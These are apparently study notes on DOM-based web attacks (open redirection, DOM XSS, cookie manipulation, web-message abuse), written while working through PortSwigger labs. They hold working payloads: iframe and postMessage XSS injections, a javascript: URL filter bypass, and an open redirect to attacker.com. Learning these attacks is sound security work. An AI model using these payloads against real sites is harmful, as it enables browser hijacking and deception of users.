
# Overview
Document Object Model (DOM) is the programming interface that displays the web document, the tree basically. For example:
```html
<html>
    <head>
        <title>Hello World!</title>
    </head>
    <body>
        <h1> Hello Moon! </h1>
        <p> The earth says hello! </p>
    </body>
</html>
```

DOM-Based attacks rely on the attacker's ability to alter this structure and change how the web page appears to the target. 

Modern Frontend Frameworks such as Angular, Vue, and React allow us to load single page applications (SPA) once and then interface with the server through APIs. 

All DOM-based attacks can be summarized by insufficiently validating and sanitizing user input before using it in JavaScript which will alter the DOM. To simplify the detection of these issues, we refer to them as sources and sinks.
- **source** - the location where untrusted data is provided by the user to a JavaScript function
- **sink** - the location where the data is used in JavaScript to update the DOM
![](/assets/images/DOM-Based%20Attacks/Screenshot%202024-12-01%20at%203.34.00%20PM.png)

The attacker may want to alter the sink for their own purposes. Example:
`goto = location.hash.slice(1) if (goto.startsWith('https:')) {   location = goto; }`
- The source is `location.hash.slice(1)` which will take the first `#` (fragment) in the URL. Without sanitization, this value is set in the `location` of the DOM, which is the sink. We can exploit it with: `https://realwebsite.com/#https://attacker.com`

## DOM-Based XSS
The most potent form of DOM-based attack, allowing you to inject JavaScript code and control of the browser. As with all DOM-based attacks, we need a source and a sink to perform the attack.
- The most common source is the URL, specifically URL fragments because we can craft a link with malicious fragments
Ex: jQuery example to navigate the page to the last viewed location
```javascript
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
```

We can XSS ourselves with: `https://realwebsite.com#<img src=1 onerror=alert(1)></img>`

But we can perform XSS on others using `iframe` with:
`<iframe src="https://realwebsite.com#" onload="this.src+='<img src=1 onerror=alert(1)>'`
- Once the website is loaded, the `src` value is updated to now include our XSS payload, triggering the `hashchange` function and, thus, our XSS payload.

## Taint-flow vulnerabilities
- Problems with the way client-side code manipulates attacker-controllable data, when the website passes data from a source to a sink

## Sources
**Sources** - JavaScript property that accepts data that is potentially attacker-controlled
- `location.search` - reads input from the query string
```js
document.URL 
document.documentURI 
document.URLUnencoded 
document.baseURI 
location 
document.cookie 
document.referrer 
window.name 
history.pushState 
history.replaceState 
localStorage 
sessionStorage 
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB) 
Database
```
These kinds of data can also be used as source to exploit taint-flow vulns:
```
Reflected data
Stored data
Web messages
```

Most common source is the URL which is typically accessed with the `location` object
![](/assets/images/DOM-Based/location_object_DOM_based.png)

## Sinks

**Sinks** - a potentially dangerous function or DOM object
- `eval()` - processes the argument passed to it as JS
- `document.body.innerHTML` - potentially allows an attacker to inject malicious HTML

```JS
document.write()
window.location
document.cookie
eval()
document.domain()
WebSocket()
element.src
postMessage()
setRequestHeader()
FileReader.readAsText()
ExecuteSql()
sessionStorage.setItem()
document.evaluate()
JSON.parse()
element.setAttribute()
RegExp()

Function()
setTimeout()
setInterval()
setImmediate()
execCommand()
execScript()
msSetImmediate()
range.createContextualFragment()
crypto.generateCRMFRequest()
```


# Dom-Based Open Redirection
When a script writes attacker-controllable data into a sink that can trigger cross-domain navigation.

```JS
location
location.host
location.hostname
location.href
location.pathname
location.search
location.protocol
location.assign()
location.replace()
open()
element.srcdoc
XMLHttpRequest.open()
XMLHttpRequest.send()
jQuery.ajax()
$.ajax()
```


## Lab: DOM-based open redirection
While navigating, the `Back to Blog` button shows the link `https://<lab>.net/post?postId=5#`
- ==I should have inspected this== and seen `<a href="#" onclick="returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : &quot;/&quot;">Back to Blog</a>`, especially `location.href` and `url`
	- The `location.href` is the vulnerable *source*
	- The `url` is the attacker-controllable input
- `https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/`
- ==Note that you are just adding the url as a parameter==

# DOM-based cookie manipulation

DOM-based cookie-manipulation vulnerabilities arise when a script writes attacker-controllable data into the value of a cookie.
- *construct a URL* that, if visited by another user, will *set an arbitrary value in the user's cookie*

The `document.cookie` **sink** can lead to DOM-based cookie-manipulation vulnerabilities.

## Lab: DOM-based cookie manipulation
*Inject a cookie that will cause XSS on a different page and call the `print()` function, requires the exploit server*

`<iframe src="https://<LAB>.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://<LAB>.net/';window.x=1;">`
- The original source of the `iframe` matches the URL of one of the product pages, except there is a JavaScript payload added to the end. When the `iframe` loads for the first time, the browser temporarily opens the malicious URL, which is then saved as the value of the `lastViewedProduct` cookie. The `onload` event handler ensures that the victim is then immediately redirected to the home page, unaware that this manipulation ever took place. While the victim's browser has the poisoned cookie saved, loading the home page will cause the payload to execute.
- **Note** that you have a `lastViewedProduct` cookie stored in your browser
- Explanation of `onload`

![](/assets/images/DOM-Based/DOM-based_cookie_manipulation.png)



# Web message manipulation and vulnerabilities
Web Messaging API

**WebMessage** = *two windows communicating with one another*

Web message vulnerabilities arise when a script sends attacker-controllable data as a web message to another document within the browser. An attacker may be able to use the web message data as a source by constructing a web page that, if visited by a user, will cause the user's browser to send a web message containing data that is under the attacker's control. The `postMessage()` method for sending web messages can lead to vulnerabilities if the event listener for receiving messages handles the incoming data in an unsafe way.
- Ex: An attacker could host a malicious `iframe` and use the `postMessage()` method to pass web message data to the vulnerable event listener, which then sends the payload to a sink on the parent page.

How to construct:
Ex:
```JS
<script> 
window.addEventListener('message', function(e) {   
	eval(e.data); 
}); 
</script>
```

Line-by-Line Breakdown
 1. `window.addEventListener('message', ...)`
	This sets up a "listener" on the current window. It tells the browser: _"If any other window (like a popup, an iframe, or a parent page) sends a message to this window using `postMessage()`, run the following function."_
2. `function(e) { ... }`
	The variable `e` (the event object) contains the data sent by the other window. Crucially, `e` also contains the **origin** (the URL) of whoever sent the message.
3. `eval(e.data);`
	This is the "Sink"—the dangerous part. The `eval()` function takes a string and executes it as JavaScript code.
	- It takes whatever was in the message (`e.data`) and runs it immediately.
	- **The Problem:** There are no checks to see **who** sent the message or **what** the message contains.

==Think of the ==`window`==as the **container** for a specific website session in a tab.==
- an `<iframe>` is a nested window (`this.src` talks to the window inside the frame)

Payload: `<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">`
- *As the event listener does not verify the origin of the message, and the `postMessage()` method specifies the `targetOrigin` `"*"`, the event listener accepts the payload and passes it into a sink, in this case, the `eval()` function.*

## Lab: DOM XSS using web messages

**Solution:**`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`
- `onload` - when the page has loaded
- `this.contentWindow.postMessage`
- `'<img src=1 onerror=print()>'` - typical XSS payload
- `'*'` - per the [MDM Web Docs](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage), the second argument for `postMessage` is either `options` or `targetOrigin`, in this case the latter. We give it `*` so that the `targetOrigin` doesn't matter, but it is needed because we are in two different origins, *as most WebMessages will be.* Consider that when use other methods. 

## Lab: DOM XSS using web messages and a JavaScript URL

See this in the `index`:
```HTML
<script>
   window.addEventListener('message', function(e) {
        var url = e.data;
        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
            location.href = url;
        }
    }, false);
</script>
```
- this is saying that the message will be set as the URL as long as it contains an `http` or `https` anywhere in the message (it's checking if the index of that string is greater than -1)

**Solution:**`<iframe src="https://<LAB_ID>.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`
- This explicitly calls the JS function `print()` and then comments `http` after that

## Lab: DOM XSS using web messages and `JSON.parse`

It looks like this is the relevant code:
```HTML
<script>
    window.addEventListener('message', function(e) {
        var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
        document.body.appendChild(iframe);
        try {
            d = JSON.parse(e.data);
        } catch(e) {
            return;
        }
        switch(d.type) {
            case "page-load":
                ACMEplayer.element.scrollIntoView();
                break;
            case "load-channel":
                ACMEplayer.element.src = d.url;
                break;
            case "player-height-changed":
                ACMEplayer.element.style.width = d.width + "px";
                ACMEplayer.element.style.height = d.height + "px";
                break;
        }
    }, false);
</script>
```
- In the JavaScript, we can see that the event listener expects a `type` property and that the `load-channel` case of the `switch` statement changes the `iframe src` attribute
- ==So we can post the Message with `\` for line breaks, including a type, load-channel, url, and javascript command==

**Solution:**`<iframe src=https://<exploit_server>.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>`

# Other 
## DOM-based document-domain manipulation

Document-domain manipulation vulnerabilities arise when a script uses attacker-controllable data to set the `document.domain` property. The `document.domain` property is used by browsers in their enforcement of the same origin policy. If two pages from different origins explicitly set the same `document.domain` value, then those two pages can interact in unrestricted ways

## WebSocket-URL poisoning
https://portswigger.net/web-security/dom-based/websocket-url-poisoning
The `WebSocket` constructor can lead to WebSocket-URL poisoning vulnerabilities.

## DOM-based link manipulation
DOM-based link-manipulation vulnerabilities arise when a script writes attacker-controllable data to a navigation target within the current page, such as a clickable link or the submission URL of a form.  

https://portswigger.net/web-security/dom-based/link-manipulation

The following are some of the main sinks can lead to DOM-based link-manipulation vulnerabilities:
```js
element.href 
element.src 
element.action
```



## DOM-based Ajax request-header manipulation
